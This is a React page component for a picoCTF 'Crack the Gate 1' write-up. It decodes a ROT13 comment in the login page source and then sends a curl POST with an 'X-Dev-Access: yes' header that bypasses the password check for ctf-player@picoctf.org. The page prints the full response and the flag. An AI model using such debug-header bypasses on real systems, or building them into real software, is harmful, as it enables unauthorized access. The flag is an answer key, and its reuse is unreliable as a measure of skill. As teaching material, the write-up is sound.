import Image from 'next/image'

export default function CrackTheGate1() {
  return (
    <div className="space-y-8">
      {/* Header Section */}
      <div className="bg-gradient-to-r from-orange-50 to-red-100 rounded-2xl p-8 border-l-4 border-orange-500">
        <h1 className="text-4xl font-bold text-gray-900 mb-4">Crack the Gate 1</h1>
        <p className="text-xl text-gray-700 leading-relaxed">
          We&apos;re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be 
          hiding sensitive data inside a restricted web portal.
        </p>
      </div>

      {/* Information Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Information Given</h2>
        
        <div className="space-y-6">
          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Description</h3>
            <p className="text-gray-700 leading-relaxed text-lg">
              We&apos;re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be 
              hiding sensitive data inside a restricted web portal. We&apos;ve uncovered the email address he uses to log in: 
              <code className="bg-red-100 text-red-800 px-2 py-1 rounded font-mono ml-2">ctf-player@picoctf.org</code>. 
              Unfortunately, we don&apos;t know the password, and the usual guessing techniques haven&apos;t worked. But something 
              feels off... it&apos;s almost like the developer left a secret way in. Can you figure it out?
            </p>
            <p className="mt-4 text-gray-600">
              Additional details will be available after launching your challenge instance.
            </p>
          </div>

          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Hints</h3>
            <ul className="space-y-2 text-gray-700">
              <li>• Developers sometimes leave notes in the code; but not always in plain text.</li>
              <li>• A common trick is to rotate each letter by 13 positions in the alphabet.</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Solution Section */}
      <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-8 text-green-400 shadow-2xl">
        <h2 className="text-3xl font-bold text-white mb-6">Solution</h2>
        
        <div className="space-y-6">
          <p className="text-green-300 text-lg">
            Let&apos;s start by launching the instance.
          </p>
          
          <p className="text-green-300 text-lg">
            After the instance is launched, let's read the "notes in the code". The hint is referring to comments:
          </p>
          
          <p className="text-green-300 text-lg">
            To see code: right click → View Page Source.
          </p>
          
          <p className="text-green-300 text-lg">
            The source code:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-6 overflow-x-auto">
            <pre className="text-green-400 font-mono text-sm">
{`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #eaeaed;
            font-family: Arial, sans-serif;
        }

        #loginForm {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        #loginForm label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        #loginForm input {
            width: calc(100% - 10px);
            padding: 8px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        #loginForm button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            border: none;
            color: white;
            border-radius: 4px;
            font-size: 16px;
        }

        #loginForm button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
    <!-- Remove before pushing to production! -->   

    <form id="loginForm">
        <h2 style="font-size: 24px; margin-bottom: 24px;">
            Login
        </h2>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                if (data.success) {
                    prompt('Login successful!\\nFlag:', data.flag);
                } else {
                    alert('Invalid credentials');
                }
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>`}
            </pre>
          </div>
          
          <p className="text-green-300 text-lg">
            The important part:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-4">
            <code className="text-yellow-400 font-mono">
              &lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" --&gt;
            </code>
          </div>
          
          <p className="text-green-300 text-lg">
            This seems to be ROT13 encoding:
          </p>
        </div>
      </div>

      {/* ROT13 Decoding */}
      <div className="bg-gradient-to-r from-purple-50 to-pink-50 rounded-xl p-8 border border-purple-200">
        <h2 className="text-3xl font-bold text-purple-900 mb-6">ROT13 Decoding</h2>
        <div className="bg-white rounded-lg p-6 shadow-lg">
          <Image
            src="/images/Screenshot 2025-10-01 at 20.10.46.png"
            alt="ROT13 decoding process"
            width={600}
            height={400}
            className="rounded-lg shadow-md mx-auto"
          />
        </div>
      </div>

      {/* Curl Command */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Curl Command</h2>
        <p className="text-gray-700 leading-relaxed mb-4">
          Let's craft the curl payload:
        </p>
        <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-6 text-green-400 font-mono shadow-2xl">
          <div className="space-y-2">
            <div><code>siddharthsehgal@mac LAST_DIR % curl -i -X POST 'http://amiable-citadel.picoctf.net:50897/login' \\</code></div>
            <div className="ml-4"><code>-H 'Content-Type: application/json' \\</code></div>
            <div className="ml-4"><code>-H 'X-Dev-Access: yes' \\</code></div>
            <div className="ml-4"><code>-d '{`{"email":"ctf-player@picoctf.org","password":"anything"}`}'</code></div>
            <div className="mt-4 text-gray-400">HTTP/1.1 200 OK</div>
            <div className="text-gray-400">**X-Powered-By**: Express</div>
            <div className="text-gray-400">**Content-Type**: application/json; charset=utf-8</div>
            <div className="text-gray-400">**Content-Length**: 127</div>
            <div className="text-gray-400">**ETag**: W/"7f-0XFNNEgUDQ6luMcdemqCj4aTy9o"</div>
            <div className="text-gray-400">**Date**: Wed, 01 Oct 2025 18:15:33 GMT</div>
            <div className="text-gray-400">**Connection**: keep-alive</div>
            <div className="text-gray-400">**Keep-Alive**: timeout=5</div>
            <div className="mt-4 text-yellow-300">{`{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"{"picoCTF{" + "brut4_f0rc4_7e5db33b" + "}"}"}`}</div>
          </div>
        </div>
      </div>

      {/* Flag Section */}
      <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-8 border-l-4 border-green-500">
        <h2 className="text-3xl font-bold text-green-800 mb-6">The Flag</h2>
        <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white p-6 rounded-xl font-mono text-xl font-bold shadow-lg">
          {"picoCTF{" + "'{'" + "}"}brut4_f0rc4_7e5db33b{'}'}
        </div>
      </div>
    </div>
  )
}
